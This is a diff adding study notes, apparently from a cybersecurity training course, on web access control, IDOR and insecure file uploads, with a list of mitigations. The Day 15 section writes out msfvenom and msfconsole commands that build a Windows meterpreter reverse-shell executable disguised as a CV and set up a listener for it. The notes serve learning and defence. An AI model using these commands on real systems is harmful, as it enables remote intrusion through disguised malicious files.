@@ -185,3 +185,37 @@ Tools for Dynamic Analysis:
 
 *PCAP*: Packet capture. Used to make a report for upper-level analysts (Suspicious IPs, names, files, etc).
 
+
+# Day 14 - Web Applications
+
+*Access Control* determines, once authenticated, if a user can access a resource, modify it, etc.
+
+[OWASP Top 10](https://owasp.org/Top10/): Common vulnerabilities in Web Applications.
+
+*IDOR* (Insecure direct object reference): Vulnerability that allows simple input manipulation to bypass access control. For example using the ID directly on the URL for accessing information.
+
+
+# Day 15 - Secure Coding
+
+Unrestricted Input Validation on file uploads can lead to:
+
+- Code execution if the uploaded file can be retrieved by the attacker (for example a web shell).
+- Infecting workstations, if the file is going to be viewed and opened by a user inside or outside the organisation.
+
+To mitigate the first one, one could store the files outside the Web Root, so they are not directly accessible from the attacker. This is not bullet-proof, as some other vulnerability may be able to recover and run the file. Or even we could hope to have some insider run the code accidentally.
+
+
+*Metasploit*'s `msfvenom` can be used to poison a file with a certain exploit. For example:
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="Listening port" -f exe -o cv-username.exe
+	sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 'listening port'; exploit"
+
+Some measures:
+
+- Store outside the Web Root
+- Content Type Validation
+- File Extension Validation
+- File Size Validations
+- Renaming the file (preferably to something random)
+- Malware Scanning (ClamAV)
+
